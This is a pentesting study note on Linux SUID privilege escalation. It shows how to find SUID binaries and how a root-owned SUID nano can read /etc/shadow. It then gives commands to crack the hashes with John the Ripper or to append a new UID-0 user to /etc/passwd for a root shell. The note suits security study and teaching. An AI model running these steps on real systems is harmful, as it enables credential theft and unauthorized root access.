# Privilege Escaltion - SUID

---

### **📘 Understanding File Permissions & Special Bits**

- **Linux privilege controls** rely heavily on file-user interaction permissions:
    - r – read
    - w – write
    - x – execute
- These apply to:
    - **Owner**
    - **Group**
    - **Others**

---

### **🧨 What is SUID & SGID?**

| **Type** | **Meaning** |
| --- | --- |
| SUID (Set-user ID) | Executes the file as the **owner** (e.g. root) |
| SGID (Set-group ID) | Executes the file as the **group** owner |
- Identified by an **s** bit in permission (e.g., -rwsr-xr-x)
- Especially dangerous when owned by root

---

### **🔍 How to Find SUID Files**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- 04000 → Look for **SUID** permissions
- Compare results with GTFOBins:
    - 🔗 https://gtfobins.github.io/#suid
    - Filtered list of **SUID-exploitable binaries**

---

### **🧪 Case Study:**

### **nano as SUID**

- If nano has the SUID bit set and is owned by root:

```
nano /etc/shadow
```

✅ Allows reading of /etc/shadow using **root’s privileges**

---

### **🔐 Method 1 – Crack Passwords Using John the Ripper**

1. **Read & save the files**

```
nano /etc/shadow    # Save as shadow.txt
nano /etc/passwd    # Save as passwd.txt
```

1. **Use unshadow to create crackable format**

```
unshadow passwd.txt shadow.txt > passwords.txt
```

1. **Crack using John**

```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

1. **Profit** 🎉 — you may recover the root password

---

### **🔐 Method 2 – Add a New Root User**

1. **Generate a password hash**

```
openssl passwd -1 "YourPassword"
```

➡️ Copy the resulting hash

1. **Format the new user entry**

```
newroot:<hash>:0:0:root:/root:/bin/bash
```

1. **Append to /etc/passwd**

```
nano /etc/passwd
```

➡️ Add the above line at the bottom

1. **Switch to the new user**

```
su newroot
```

✅ You now have a **root shell**

---

### **🧠 Final Notes**

- SUID/SGID files are **real-life misconfiguration vectors**
- Not every SUID file is easily exploitable — some may need **chaining** or **manual creativity**
- Always review binary behavior before exploitation